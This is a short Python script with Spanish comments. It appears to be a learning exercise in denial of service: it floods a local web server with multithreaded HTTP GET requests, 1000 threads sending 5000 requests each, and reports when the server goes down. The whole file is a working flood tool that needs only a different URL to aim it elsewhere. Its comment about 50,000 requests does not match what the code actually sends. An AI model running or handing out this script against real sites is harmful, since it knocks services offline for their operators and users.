# En este kDenegacion de servicio se pone un limite de paqeutes 
# Que pueden afectar una pagina web sencilla tumbandola con 50000 peticiones
# Primero se instala requests con el siguiente comando "pip install requests"
# Luego de bajar librerias, las importamos
import requests
import threading
import time

# Configura la URL de destino (usa tu propio servidor local o autorizado)
url = "http://192.168.1.6:8000"

# Cantidad de peticiones por un hilo
Peticiones_Hilo = 5000

# Número de hilos (clientes simulados simultáneos)
Cantidad_Hilos = 1000

# Funcion que ejecuta solicitudes GET
def send_requests():
    for _ in range(Peticiones_Hilo):
        try:
            response = requests.get(url)
            print(f"Estado: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error, se cayo el servidor: {e}")

# Calcular tiempo actual
Tiempo_inicial = time.time()

# Crear y lanzar los hilos
Hilos_web = []
for _ in range(Cantidad_Hilos):
    Hilo = threading.Thread(target=send_requests)
    Hilo.start()
    Hilos_web.append(Hilo)

# Esperar a que todos los hilos terminen
for Hilo in Hilos_web:
    Hilo.join()

Tiempo_Final = time.time()
print(f"Test completo en {Tiempo_Final - Tiempo_inicial:.2f} segundos")